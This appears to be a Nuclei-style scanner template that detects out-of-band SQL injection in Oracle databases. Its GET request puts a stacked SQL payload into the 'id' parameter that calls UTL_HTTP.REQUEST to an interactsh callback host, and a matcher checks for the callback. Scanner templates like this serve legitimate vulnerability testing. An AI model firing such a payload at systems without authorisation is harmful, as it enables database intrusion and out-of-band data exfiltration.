id: oracle-http-utl

info:
  name: Oracle HTTP UTL OOB
  author: openai
  severity: high
  tags: oracle,oob,http

http:
  - method: GET
    path:
      - "{{BaseURL}}/?id=1; SELECT UTL_HTTP.REQUEST('http://{{interactsh-url}}') FROM DUAL--"

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
